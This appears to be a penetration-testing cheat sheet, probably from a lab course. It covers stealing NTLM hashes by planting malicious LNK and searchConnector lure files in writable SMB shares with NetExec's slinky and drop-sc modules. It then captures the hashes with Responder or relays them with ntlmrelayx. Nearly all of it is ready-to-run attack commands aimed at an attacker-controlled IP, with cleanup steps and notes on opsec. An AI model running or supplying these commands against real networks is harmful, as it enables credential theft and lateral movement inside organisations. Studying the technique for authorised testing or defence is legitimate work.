# 06.18 Stealing Hashes Slinky drop-sc NTLMRelay

> Plant `.lnk` (slinky) and `.searchConnector-ms` (drop-sc) lures in writable shares to coerce NTLM auth for cracking or relay.

## Overview

CME modules `slinky` and `drop-sc` plant malicious files in writable SMB shares that coerce NTLM authentication to an attacker-controlled server. Slinky creates LNK files with UNC icon paths; drop-sc creates `.searchConnector-ms` files using WebDAV. Captured NTLMv2 hashes can be cracked (hashcat mode 5600) or relayed via `ntlmrelayx` to hosts with SMB signing disabled.

## Steps

- First identify writable shares with `--shares`; look for `READ,WRITE` entries.
- Use `proxychains4 -q` + `--gen-relay-list relay.txt` on the internal subnet to get relay targets.
- Start Responder (`sudo responder -I tun0`) to capture NTLMv2 hashes from slinky-triggered auth.
- For relay: run `sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http`.
- Slinky: `SERVER=<attacker_IP>` and `NAME=<filename>`; always run `CLEANUP=YES` afterward.
- drop-sc: `URL=\\\\<IP>\\<share>` (double-escaped), `SHARE=<target_share>`, `FILENAME=<name>`; cleanup with `CLEANUP=True FILENAME=<name>`.
- Both modules prompt "not opsec safe" before execution.

## Commands

### Find writable shares via proxychains

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> --shares
```

### Get relay list for internal subnet

```bash
proxychains4 -q nxc smb <TARGET>/24 --gen-relay-list relay.txt
```

### Deploy slinky LNK files

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> -M slinky -o SERVER=10.10.14.33 NAME=important
```

### Cleanup slinky LNK files

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> -M slinky -o NAME=important CLEANUP=YES
```

### Deploy drop-sc searchConnector file

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
```

### Cleanup drop-sc files

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> -M drop-sc -o CLEANUP=True FILENAME=secret
```

### Run ntlmrelayx against relay targets

```bash
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
```

### Start Responder for hash capture

```bash
sudo responder -I tun0
```
